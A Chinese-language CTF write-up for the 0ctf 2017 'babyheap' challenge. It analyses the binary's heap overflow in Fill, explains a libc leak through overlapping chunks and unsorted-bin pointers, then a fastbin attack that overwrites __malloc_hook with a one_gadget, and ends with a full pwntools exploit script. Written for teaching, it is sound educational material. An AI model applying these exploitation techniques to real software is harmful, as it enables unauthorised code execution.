# babyheap_0ctf_2017

## 程序静态分析

程序流程很简单，基本如下图所示：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-06_20-03-33.png)

进一步，对一些特点做具体分析

### Allocate

首先需要，注意的是`Allocate`函数，

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-06_20-28-04.png)

> 在该函数中，主要是要注意 程序构建的 管理堆栈的结构体；其次每次分配时，都会从`index 0`开始遍历堆块的`in_use`位，来判断该程序是否被使用过。

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-06_20-36-32.png)

在该函数中，程序构建了这样一个结构体，若堆块已分配；**`in_use =1，size，ptr都会得到对应的数据填充`，在循环中，`index`就会被跳过**

### Fill函数

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-06_20-40-10.png)

`Fill`需要注意，我们在输入填充到`ptr`所指向的地址时，又再次输入了`size`；所以到目前有了两次的`size`输入,第一次，在我们分配堆块的时候，输入`size`来确定分配的堆块的大小，而此时，填充的内容大小`size`再次输入，且没有做大小和边界检查，所以我们可以根据此时的`size`填入任意长度的数据

### Free函数

Free函数 没有什么好说，主要是将堆块对应的结构体内容 置 0

### Dump

主要就是将数据打印



## 漏洞利用思路

### 主要关键点：

- 64位程序`fast_bin`存放的堆块大小区间为`0x10-0x70`算上头部即为`0x20-0x80`所以构建的分配堆块大小为`0x80`算上头部也就是`0x90`会进入`unsorted_bin`存储
- 在`unsorted_bin`中空闲堆块会构成一个`双向的链表`;所以当`unsorted_bin`中仅有一个空闲堆块时，该堆块的`fd`和`bk`指针都会指向同一个位置，极`bins`的`unsorted_bin`；而这个位置是确定的，即`main_arena+88`
- 当我们得到`main_arena+88`也就能得到`main_arena`地址；根据相对偏移，`__malloc_hook`地址位于`main_arena-0x10`的位置，如果得到了`__malloc_hook`那我们就能根据该相对偏移来泄露`libc`地址，得到我们想要的地址
- `__malloc_hook`的使用： 当程序调用`malloc`或则`calloc`时，程序就会调用`glibc`的`__malloc_hook`来提供服务；因此若我们将该函数替换为我们想要跳转的函数，即可实现我们的操作。
- `fast_bin`是一个单向链表，其空闲快的`fd`指针指向下一个空闲块
- `execv_addr`这一类系统函数，可以通过`one_gadget`对`libc`来获取相对偏移位置
- `malloc(size)`分配的是`size`的可读写空间，实际的堆块会大`0x10`会加上头部，即`chunk = size + 0x10`,同时，`malloc`的返回地址是一个指向其数据域的指针，不是指向头部的指针！！！

### 实现细节：

#### Libc的泄露

- 申请4个大小为`0x80`的堆块(算上头部也就是`0x90`的大小)，对于使用中的堆块，起作用的只有`size`位标明该堆块的大小，头部中的另一个`pre_size`无效，被上一个堆块复用，在图中标出；此外还需要注意位于`size`域中的`prev_inuse`用于记录前一个堆块是否分配。(`1`就是前一个堆块已分配,对应`0`就是尚未分配)
- 然后释放堆块二，此时对于堆管理器中仅有大小为`0x80`的堆块；利用**对堆块0进行内容越界写，将堆块1的`size`改为0x121 = 0x120+1**
- 然后分配`0x110`大小的堆块，此时`unsorted_bin`中满足大小的仅有堆块1(size = 120;头部大小为0x10，可用空间为0x110)；然后再`fill(1)`由于内存分配使用的是`calloc`，会将内存全部清零，因此块2的头部数据无效，需要进行填充对应的数据然后再`free(2)`
- 此时的块2被释放后进入`unsorted_bin`,其`fd`和`bk`指针指向同一个位置即`main_arena+88`
- 在这里需要说一下堆块3的作用，块3分配，并没有被使用，是为了防止块2被释放后和后面的空闲空间合并；从而无法利用；通过块3的分配保证了块2的紧邻位置无空闲块，无法进行空闲块合并

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-09_21-16-56.png)

<center >整个堆块的构成如上图所示，进一步利用可到的`libc`的泄露</center>

- 所以此时形成了有一个空闲块位于`unsorted_bin`，即块2，而对用程序来说块2的空间 也是块1的内容，所以块1 可以读取块2的内容，从而得到`fd`和`bk`的值，得到`main_arena+88`的地址，从而能够泄露得到libc

#### fast_bin 攻击

- 首先是`alloc(0x80)、alloc(0x60)、alloc(0x60)`得到6个分配的堆块，这里要说一下，首先分配`alloc(0x80)`是为了消耗掉堆块的分配**序号2**；同时消耗掉该堆块大小；如果没有这一步，直接`alloc(0x60)`会存在两个问题，根据程序的流程，**会对序号0开始到15依次验证是否分配，很明显序号2空闲，其序号会为2，容易混淆；其次此时有一个空闲的大小为0x80的堆块，堆块的分配使用首次使用算法，会对该堆块进行切割，也不符合我们的操作目的**
- `free(5)`;堆块5作为空闲堆块，其大小正好进行`fast_bin`序列，此时由于堆块5已被释放，处于空闲态，无法填充内容，所以我们利用堆块4，`fill(4)`来越界写，从对其进行填充，将其`fd`指针填充为一个特定的地址，题目中命名为`fake_small_bin_addr`
- 对于位于`fast_bin`列表的堆块来说，他们都是单链表链接，且为`LIFO`结构，`fd`指针指向下一个可分配的空闲堆块，`fd =fake_small_bin_addr`即理解为`fake_small_bin_addr`开始的位置是一个大小为`0x70`的堆块
- 这个`fake_small_bin_addr`即为`malloc_hook_addr - 0x23`，为什么是这个地址？
- 这是由于`malloc_hook_addr - 0x23`**+0x10**处的值正好是`0x7f`，能够作为一个堆块的`size`域进行解析；对应解析为一个堆块大小为`0x60`的size域；至于该数据的前八个字节，一般认为是`prev_size`的区域，没有作用所以可以直接忽略，这样就构成了一个堆块
- 对于`fast_bin`来说，为了被快速分配，该列表的空闲堆块不会进行合并，所以其`pre_inuse`位总是置1
- `alloc(0x60)、alloc(0x60)`,由于`fast_bin`是一个`LIFO`的结构，所以需要分配两次，先分配堆块5，其次是我们伪造的堆块，分配成为堆块6
- 然后`fill(6)`在内容其实偏移`0x13`的地址处即为`malloc_hook_addr`,将其填充为`execv_addr`

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-12-10_20-59-34.png)



此时分配任意大小的堆块，程序调用`malloc`函数，底层调用`malloc_hook_addr`,由于已被替换，会跳转`execv_addr`函数；整个流程就完了



## exp

```python
#coding:utf-8
from os import execve
from pwn import *
from LibcSearcher import *

context(os ="linux",arch= "amd64",log_level = "debug")

io = process("/home/always/PWN/babyheap_0ctf_2017")
#io = remote("node4.buuoj.cn",28805)
def alloc(size):
    io.sendlineafter("Command: ",'1')
    io.sendlineafter("Size: ",str(size))

def fill(index,content):
    io.sendlineafter("Command: ",'2')
    io.sendlineafter("Index: ",str(index))
    io.sendlineafter("Size: ",str(len(content)))
    io.sendlineafter("Content: ",content)

def free(index):
    io.sendlineafter("Command: ",'3')
    io.sendlineafter("Index: ",str(index))

def dump(index):
    io.sendlineafter("Command: ",'4')
    io.sendlineafter("Index: ",str(index))

alloc(0x80)#0
alloc(0x80)#1
alloc(0x80)#2
alloc(0x80)#3
#pause()

# ---------------- leak libc --------------------------------
free(1)
fill(0,b'a'*(0x80+8)+p64(0x120+1))
alloc(0x110) #1
fill(1,b'a'*(0x80+8)+p64(0x90+1))
free(2)

dump(1)
#---------------------- get libc base----------------------
io.recv(0x90+0xa)
main_arena_88_addr = u64(io.recv(0x8))
log.success("Main_arean_addr:===================>{}".format(hex(main_arena_88_addr)))
malloc_hook_addr = main_arena_88_addr - 88 -0x10
fake_small_bin_addr = malloc_hook_addr - 0x23
libc = ELF("/home/always/Libc/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")		#与下面的execve_offset相对应
#libc = ELF("/home/always/Libc/libc-2.23.so")
libc_base = malloc_hook_addr - libc.sym["__malloc_hook"]
log.success("libc_base_addr :======================>{}".format(hex(libc_base)))
execve_offset = 0x4527a    #通过one_gadget 获得，每个libc都不一样
execve_addr = libc_base + execve_offset
log.success("execve_addr: =============================>{}".format(hex(execve_addr)))
#---------------- get libc base end -------------------------------

#------------------- fast bin attack ----------------------------------------
alloc(0x80) #2
alloc(0x60) #4
alloc(0x60) #5
free(5)
fill(4,b"a"*(0x60 +8) + p64(0x70 + 1)+p64(fake_small_bin_addr))
#pause()
alloc(0x60) #5
alloc(0x60) #6
fill(6,b"a"*0x13 + p64(execve_addr))
#pause()
alloc(0x1)

io.interactive()


```

